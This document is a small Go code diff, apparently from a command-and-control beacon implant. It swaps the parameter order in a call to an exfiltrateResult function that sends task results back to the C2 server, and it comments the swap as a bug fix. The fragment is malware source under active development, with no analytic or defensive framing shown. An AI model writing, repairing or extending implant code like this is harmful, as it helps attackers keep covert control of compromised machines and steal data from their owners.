@@ -366,7 +366,7 @@ func (b *Beacon) handleUpdateDomains(domainsJSON string) {
 
 // sendResult sends a task result back to the C2
 func (b *Beacon) sendResult(taskID, result string) error {
-	return b.exfiltrateResult(taskID, result)
+	return b.exfiltrateResult(result, taskID) // Fix: parameters were reversed
 }
 
 // runBeacon starts the beacon loop
